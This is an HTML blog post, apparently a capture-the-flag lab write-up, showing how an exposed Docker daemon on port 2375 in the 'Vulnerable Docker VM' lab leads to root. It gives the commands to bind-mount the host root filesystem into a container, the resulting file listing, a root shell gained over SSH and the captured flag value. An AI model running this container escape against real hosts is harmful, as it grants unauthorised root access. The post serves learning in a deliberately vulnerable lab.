@@ -1,0 +1,322 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Vulnerable Docker VM: Easy - tcunha.github.io</title>
+  <meta name="author" content="tcunha">
+
+  
+  <meta name="description" content="Scanning with nmap reveals that the host is exposing the Docker daemon on port
+2375/tcp. Connecting and interacting with it is possible: 1
+2
+3
+4
+5
+6 &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://tcunha.github.io/blog/2017/11/01/vulnerable-docker-vm-easy/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="tcunha.github.io" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">tcunha.github.io</a></h1>
+  
+    <h2>The lesson of history is that no one learns.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="tcunha.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Vulnerable Docker VM: Easy</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2017-11-01T10:58:32+00:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2017</span></span> <span class='time'>10:58 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Scanning with nmap reveals that the host is exposing the Docker daemon on port
+2375/tcp. Connecting and interacting with it is possible:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">#</span> <span class="nb">export </span><span class="nv">DOCKER_HOST</span><span class="o">=</span>tcp://172.19.0.108:2375
+</span><span class='line'><span class="gp">#</span> docker version
+</span><span class='line'><span class="go">Client:</span>
+</span><span class='line'><span class="go"> Version:      17.05.0-ce</span>
+</span><span class='line'><span class="go"> API version:  1.29</span>
+</span><span class='line'><span class="go"> Go version:   go1.8.1</span>
+</span><span class='line'><span class="go"> Git commit:   v17.05.0-ce</span>
+</span><span class='line'><span class="go"> Built:        Tue May 16 10:10:15 2017</span>
+</span><span class='line'><span class="go"> OS/Arch:      linux/amd64</span>
+</span><span class='line'>
+</span><span class='line'><span class="go">Server:</span>
+</span><span class='line'><span class="go"> Version:      17.06.0-ce</span>
+</span><span class='line'><span class="go"> API version:  1.30 (minimum version 1.12)</span>
+</span><span class='line'><span class="go"> Go version:   go1.8.3</span>
+</span><span class='line'><span class="go"> Git commit:   02c1d87</span>
+</span><span class='line'><span class="go"> Built:        Fri Jun 23 21:17:13 2017</span>
+</span><span class='line'><span class="go"> OS/Arch:      linux/amd64</span>
+</span><span class='line'><span class="go"> Experimental: false</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Having direct access to the daemon is a big no-no. This gives the ability to
+execute any commands on the remote daemon, like creating a new container and
+taking advantage of the shared filesystem (-v) functionality, by bind-mounting
+the host root directory and having access to all of its files:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">#</span> docker run -v /:/srv -it --rm wordpress:latest bash
+</span><span class='line'><span class="gp">root@23890602df34:/var/www/html#</span> ls -l /srv
+</span><span class='line'><span class="go">total 80</span>
+</span><span class='line'><span class="go">drwxr-xr-x   2 root root  4096 Aug 16 17:04 bin</span>
+</span><span class='line'><span class="go">drwxr-xr-x   3 root root  4096 Aug 22 14:11 boot</span>
+</span><span class='line'><span class="go">drwxr-xr-x  14 root root  4080 Nov  1 10:26 dev</span>
+</span><span class='line'><span class="go">drwxr-xr-x  90 root root  4096 Nov  1 10:26 etc</span>
+</span><span class='line'><span class="go">-r--------   1 root root   414 Aug 21 20:30 flag_3</span>
+</span><span class='line'><span class="go">drwxr-xr-x   4 root root  4096 Aug 16 05:56 home</span>
+</span><span class='line'><span class="go">lrwxrwxrwx   1 root root    34 Aug 16 08:30 initrd.img -&gt; boot/initrd.img-3.13.0-128-generic</span>
+</span><span class='line'><span class="go">drwxr-xr-x  21 root root  4096 Aug 16 06:36 lib</span>
+</span><span class='line'><span class="go">drwxr-xr-x   2 root root  4096 Aug 16 06:36 lib64</span>
+</span><span class='line'><span class="go">drwx------   2 root root 16384 Aug 14 08:02 lost+found</span>
+</span><span class='line'><span class="go">drwxr-xr-x   3 root root  4096 Aug 14 08:03 media</span>
+</span><span class='line'><span class="go">drwxr-xr-x   2 root root  4096 Apr 10  2014 mnt</span>
+</span><span class='line'><span class="go">drwxr-xr-x   2 root root  4096 Apr 16  2014 opt</span>
+</span><span class='line'><span class="go">dr-xr-xr-x 108 root root     0 Nov  1 10:26 proc</span>
+</span><span class='line'><span class="go">drwx------   4 root root  4096 Aug 22 14:19 root</span>
+</span><span class='line'><span class="go">drwxr-xr-x  19 root root   700 Nov  1 10:26 run</span>
+</span><span class='line'><span class="go">drwxr-xr-x   2 root root  4096 Aug 16 17:04 sbin</span>
+</span><span class='line'><span class="go">drwxr-xr-x   2 root root  4096 Apr 16  2014 srv</span>
+</span><span class='line'><span class="go">dr-xr-xr-x  13 root root     0 Nov  1 10:26 sys</span>
+</span><span class='line'><span class="go">drwxrwxrwt   2 root root  4096 Nov  1 10:30 tmp</span>
+</span><span class='line'><span class="go">drwxr-xr-x  10 root root  4096 Aug 14 08:02 usr</span>
+</span><span class='line'><span class="go">drwxr-xr-x  12 root root  4096 Aug 14 08:12 var</span>
+</span><span class='line'><span class="go">lrwxrwxrwx   1 root root    31 Aug 16 08:30 vmlinuz -&gt; boot/vmlinuz-3.13.0-128-generic</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since when running nmap revealed that the host is also making use of SSH, having
+the host root directory mapped, it&rsquo;s only a matter of generating a key and
+logging in to get root on the compromised host:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='console'><span class='line'><span class="gp">root@vulndocker:~#</span> id
+</span><span class='line'><span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
+</span><span class='line'><span class="gp">root@vulndocker:/#</span> head -n1 /flag_3
+</span><span class='line'><span class="go">d867a73c70770e73b65e6949dd074285dfdee80a8db333a7528390f6</span>
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">tcunha</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2017-11-01T10:58:32+00:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2017</span></span> <span class='time'>10:58 am</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/vm/'>vm</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://tcunha.github.io/blog/2017/11/01/vulnerable-docker-vm-easy/" data-via="" data-counturl="http://tcunha.github.io/blog/2017/11/01/vulnerable-docker-vm-easy/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/12/29/protostar-stack/" title="Previous Post: Protostar stack">&laquo; Protostar stack</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2017/11/01/vulnerable-docker-vm-hard/" title="Next Post: Vulnerable Docker VM: Hard">Vulnerable Docker VM: Hard &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2017/11/01/vulnerable-docker-vm-hard/">Vulnerable Docker VM: Hard</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/11/01/vulnerable-docker-vm-easy/">Vulnerable Docker VM: Easy</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/29/protostar-stack/">Protostar Stack</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/11/12/rop-primer-0-dot-2/">ROP Primer: 0.2</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2017 - tcunha -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
